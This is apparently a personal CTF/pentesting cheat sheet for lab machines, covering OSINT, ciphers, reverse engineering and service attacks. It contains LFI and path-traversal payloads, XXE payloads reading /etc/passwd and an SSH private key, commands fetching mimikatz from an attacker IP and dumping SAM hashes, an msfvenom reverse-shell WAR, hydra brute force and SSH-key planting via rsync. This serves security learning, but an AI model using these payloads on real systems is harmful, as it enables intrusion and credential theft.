43- ## OSINT, Search Tools, Social Media, Video to image, Domain reconn/lookup
============================================================================
==> https://ffmpeg.org (Video to image)
==> https://lookup.icann.org/lookup (Domain lookup)
==> https://www.whois.com
==> https://www.whoxy.com
==> https://dawhois.com
==> https://viewdns.info
==> $ whois RepublicOfKoffee.com
==> https://cirw.in/gpg-decoder/ (PGP DECODER)
==> $ curl https://raw.githubusercontent.com/sakurasnowangelaiko/PGP/main/publickey | gpg
==> https://whatsmyname.app (SEARCH USERNAMES)
==> https://etherscan.io (SEARCH INFO ABOUT WALLET HASH)
==> https://wigle.net (SEARCH WIFI PLACE WITH SSID)


44- ## RDP, Remote Desktop Protocol, Windows
============================================================================
==> $ rdesktop -u SG -p UmbracoIsTheBest! <IP>


45- ## CTF, Crypto, Decoding, picoCTF, Encoding, Cipher
============================================================================
Subbreaker (Substitution cipher bruteforce)
---------------------------------------------
==> $ subbreaker encode --key ZEBRASCDFGHIJKLMNOPQTUVWXY --text "flee at once. we are discovered!"
==> $ subbreaker decode --key ZEBRASCDFGHIJKLMNOPQTUVWXY --text "siaa zq lkba. va zoa rfpbluaoar!"
==> $ subbreaker break --lang EN --text \
	"Rbo rpktigo vcrb bwucja wj kloj hcjd, km sktpqo, cq rbwr loklgo
	> vcgg cjqcqr kj skhcja wgkja wjd rpycja rk ltr rbcjaq cj cr.
	> -- Roppy Lpwrsborr"
==> $ subbreaker break --lang EN --ciphertext <(cat public/study-guide.txt | head -n 50)
==> $ subbreaker decode --key xunmrydfwhglstibjcavopezqk --ciphertext public/flag.txt

Ciphey
-------------------------------------------------
==> $ ciphey -t "krxlXGU{zgyzhs_xizxp_92533667}"

Less important
---------------------------------------------------
==> $ openssl req -in readmycert.csr -noout -text
==> $ hURL -x -s "50 6f 4b 65 4d 6f 4e 7b 42 75 6c 62 61 73 61 75 72 7d"

Cipher identifier
----------------------------------------------------
==> https://www.boxentriq.com/code-breaking/cipher-identifier

46- ## Encryption, Encoding, Cipher
============================================================================
==> Atbash cipher
==> Enigma cipher
==> Rot13 cipher (Bruteforce)
==> Rot47 cipher (Bruteforce)
==> Xor Bruteforce
==> Bifid, Trifid cipher
==> Vigenère cipher
==> Vigenère solver (Bruteforce) : https://www.guballa.de/vigenere-solver


47- ## Reverse engineering, pwn, Binary exploitation, ELF
=============================================================================
RADARE 2
==> $ r2 -d ./crackme4 (Let’s debug)
==> $ aaa (Analyze the program)
==> $ afl (lists functions)
==> $ pdf @main (there’s is mainfunction)
==> $ db 0x004006d5, ood ‘argement’ (Set breakpoint)
==> $ dc, pdf @sym.compare_pwd (Run til breakpoint)
==> $ px @rdi (Let’s check the value)

GDB DEBUGGER
==> $ gdb crackme4 (Let's debug)
==> (gdb) info functions (List all functions)
==> (gdb) b *0x0000000000400520 (Breakpoint)
==> (gdb) run test (Run the binary)
==> (gdb) info registers (List all registers)
==> (gdb) x/s 0x7fffffffe030 (Print the string of the address)

COMMAND LINUX
==> $ ltrace ./crackme4 password

48- ## GIT Tools
=============================================================================
==> $ git clone https://github.com/internetwache/GitTools.git/
==> $ ./gitdumper.sh http://MACHINE_IP_ADDRESS/.git/ clone
==> $ git status
==> $ git log
==> $ git show 395e087334d613d5e423cdf8f7be27196a360459


49- ## LFI (Local File Inclusion), Encode php file
============================================================================
==> http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//etc/passwd
==> ?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log?cmd=whoami
==> http://example.com/index.php?page=../../../etc/passwd
==> http://example.com/index.php?page=....//....//....//etc/passwd
==> http://example.com/index.php?page=....\/....\/....\/etc/passwd
==> http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
==> http://example.com/index.php?page=../../../etc/passwd%00
==> https://book.hacktricks.xyz/pentesting-web/file-inclusion#basic-lfi-and-bypasses
==> ?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
==> ?view=/var/www/html/development_testing/.././.././../log/apache2/access.log (We can bypass the path traversal protection by replacing ../.. with .././..)


50- ## CURL command
=============================================================================
==> $ curl -v http://mafialive.thm/
==> $ curl -s http://mafialive.thm/
==> $ curl --cookie "token=this_is_not_real" http://10.10.23.186/
==> $ curl http://glitch.thm/secret -H 'Cookie: token=this_is_not_real'
==> $ curl -XPOST http://10.10.23.186/api/items
==> $ curl http://glitch.thm/api/items -H 'Cookie: token=this_is_not_real' -X POST
==> $ curl -XPOST "http://10.10.23.186/api/items?cmd=process.cwd()"


51- ## Metasploit, Exploitation, Searchsploit
=============================================================================
==> (pop3) : $ use auxiliary(scanner/pop3/pop3_login)



52- ## POP3 service, connection, (Default port 110)
=============================================================================
==> $ hydra -L usernames.txt -P passwords.txt pop3://10.10.137.20
==> $ nc 10.10.143.21 110 / telnet 10.10.137.20 110
	USER seina
	+OK
	PASS scoobydoo2
	+OK Logged in.
	list
	+OK 2 messages:
	1 1622
	2 1280
	retr 1
	--------------------------
	retr 2
	--------------------------


53- ## XML, XXE Exploit
=============================================================================
==> <?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE data [
	   <!ELEMENT data ANY >
	   <!ENTITY name SYSTEM "file:///etc/passwd" >]>
	<comment>
	  <name>&name;</name>
	  <author>Pavandeep</author>
	  <com>Hacking Articles</com>
	</comment>


==> <?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE data [
	   <!ELEMENT data ANY >
	   <!ENTITY name SYSTEM "file:///home/barry/.ssh/id_rsa" >]>
	<comment>
	  <name>&name;</name>
	  <author>Pavandeep</author>
	  <com>Hacking Articles</com>
	</comment>


54- ## Steganography, Stegsnow, snow, Whitespace
==============================================================================
==> $ stegsnow -C -m "Hello There" -p "123456" input.txt output.txt (ENCRYPT)
	-m : message à cacher dans le fichier input.txt
	input.txt : fichier normal dans lequel on veut cacher un message whitespace
	output.txt : fichier qui contient le texte de input.txt et le message caché sous forme whitespace
	-p : le mot de passe utilisé pour caché le 
==> $ stegsnow -C -m “MessageToHide” -p “Password” “InputTextFile” “OutputTextFile” (ENCRYPT)
==> $ stegsnow -C -p "123456" output.txt (DECRYPT)
	-p : même mot de passe que celui utilisé pour l'encryptage
	output.txt : Notre fichier de sortie qui contient le message caché
==> $ snow -C -p “Password” “OutputTextFile” (DECRYPT)
==> https://github.com/0xHasanM/SnowCracker (CRACK SNOW)
==> $ python3 snowcracker.py -c N -f flag.txt -w wordlist 
==> $ python3 snowcracker.py -c Y -f flag.txt -w wordlist 


55- ## Ifconfig down and up, delete, wifi, wlan0, tun0, eth0
==============================================================================
==> $ sudo ifconfig tun0 down
==> $ sudo ifconfig tun1 down
==> $ sudo ip link delete tun0
==> $ sudo ip link delete tun1


56- ## Windows Privilege Exploitation, Mimikatz
=============================================================================
==> $ voke-WebRequest -OutFile mimikatz.exe http://<attacker ip>:<attacker port>/mimikatz.exe (GET FILE)
==> $ certutil.exe   -urlcache -f http://10.8.204.34:80/mimikatz.exe mimikatz.exe (GET FILE)
==> $ .\mimikatz "lsadump::sam" exit (HASHDUMP)
==> $ systeminfo (VIEW OS INFO)
==> $ del mon_fichier.txt (DELETE FILE)
==> $ git clone https://github.com/ParrotSec/mimikatz.git (GET MIMIKATZ)


57- ## Exploit Database, Searchsploit, CVE
=============================================================================
--- oscommerce
==> version : 2.3.4
==> Exploit : ctf/cve/44374.py

--- kibana
==> version : 6.5.4
==> Exploit : https://github.com/mpgn/CVE-2019-7609?tab=readme-ov-file

--- Simple Image Gallery System
==> version :
==> Exploit : ctf/cve/50214.py

--- Tomcat Apache, War Backup
==> msfvenom -p java/jsp_shell_reverse_tcp lhost=10.11.74.83 lport=4444 -f war -o shell.war

--- Webdav
==> http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html



58- ## COMMANDE LINUX, SHELL/BASH SCRIPTING
=============================================================================
--[FIND]--
==> $ find / -type f \( -name 8V2L -o -name bny0 -o -name c4ZX -o -name D8B3 -o -name FHl1 -o -name oiM0 -o -name PFbD -o -name rmfX -o -name SRSq -o -name uqyw -o -name v2Vb -o -name X1Uy \) -exec ls -l {} \; 2>/dev/null
	/ : root directory
	-type f : type (f = file, d = directory)
	-o : OR (Use for many possibilities)
	-exec : execute a command on each value from the search
	{} : indique each result of the search
==> $ find / -type f -group best-group 2>/dev/null
==> $ find / -type f  -exec grep -E '[0-9{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' {} \; 2>/dev/null
==> $ find / -type f \( -name "8V2L" -o -name "bny0"  -o -name "c4ZX"  -o -name "D8B3" -o -name "FHl1" -o -name "oiMO" -o -name "PFbD" -o -name "rmfX" -o -name "SRSq" -o -name "uqyw" -o -name "v2Vb" -o -name "X1Uy" \) -exec grep -EH -o '[0-9{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' {} \; 2>/dev/null
==> $ find / -type f -exec sha1sum {} \; 2>/dev/null | grep 9d54da7584015647ba052173b84d45e8007eba94
==> $ find / -type f \( -name "8V2L" -o -name "bny0"  -o -name "c4ZX"  -o -name "D8B3" -o -name "FHl1" -o -name "oiMO" -o -name "PFbD" -o -name "rmfX" -o -name "SRSq" -o -name "uqyw" -o -name "v2Vb" -o -name "X1Uy" \) -exec sha1sum {} \; 2>/dev/null | grep 9d54da7584015647ba052173b84d45e8007eba94
==> $ find / -type f \( -name "8V2L" -o -name "bny0"  -o -name "c4ZX"  -o -name "D8B3" -o -name "FHl1" -o -name "oiMO" -o -name "PFbD" -o -name "rmfX" -o -name "SRSq" -o -name "uqyw" -o -name "v2Vb" -o -name "X1Uy" \) -exec wc -l {} \;  2>/dev/null | grep -w 230
	-w : grep -w is to search for a specific word, not a sub string ( 230 will show but 2303 won’t
==> $ find / -type f \( -name "8V2L" -o -name "bny0"  -o -name "c4ZX"  -o -name "D8B3" -o -name "FHl1" -o -name "oiMO" -o -name "PFbD" -o -name "rmfX" -o -name "SRSq" -o -name "uqyw" -o -name "v2Vb" -o -name "X1Uy" \) -exec ls -ln {} \;  2>/dev/null
==> $ find / -type f \( -name "8V2L" -o -name "bny0"  -o -name "c4ZX"  -o -name "D8B3" -o -name "FHl1" -o -name "oiMO" -o -name "PFbD" -o -name "rmfX" -o -name "SRSq" -o -name "uqyw" -o -name "v2Vb" -o -name "X1Uy" \) -perm +001  2>/dev/null

--[LOCATE]--
==> $ locate *water*.txt


59- ## NFS, MOUNT, Showmount, service
===========================================================================
==> $ sudo showmount -e 10.10.96.14 (Check if there are mounted file)

--create mount point
==> $ mkdir tmp/
==> $ sudo mount -t nfs 10.10.190.83: tmp
==> $ mount -t nfs -o id_address_of_room:/opt/conf /tmp/vuln -o nolock
==> $ tree tmp


60- ## Redis, service, port 6379
===========================================================================
==> $ redis-cli -h 10.10.85.208 -p 6379 -a "B65Hx562F@ggAZ@F"
==> 10.10.85.208:6379> keys *
==> 10.10.85.208:6379> get "internal flag"
==> 10.10.85.208:6379> type authlist
==> 10.10.85.208:6379> lrange authlist 1 10

61- ## Rsync, service, port 873
===========================================================================
==> $ rsync --list-only rsync://rsync-connect@10.10.85.208/files/sys-internal/ (List content)
==> $ rsync -av rsync://rsync-connect@10.10.85.208:873/files/ ./files (Download contents)
==> $ rsync id_rsa.pub rsync://rsync-connect@10.10.96.14/files/sys-internal/.ssh/authorized_keys
==> $ rsync -av authorized_keys rsync://rsync-connect@10.10.30.242:873/files/sys-internal/.ssh (Upload file)


62- ## Running service
============================================================================
==> ss -ltp
==> ss -tulpn
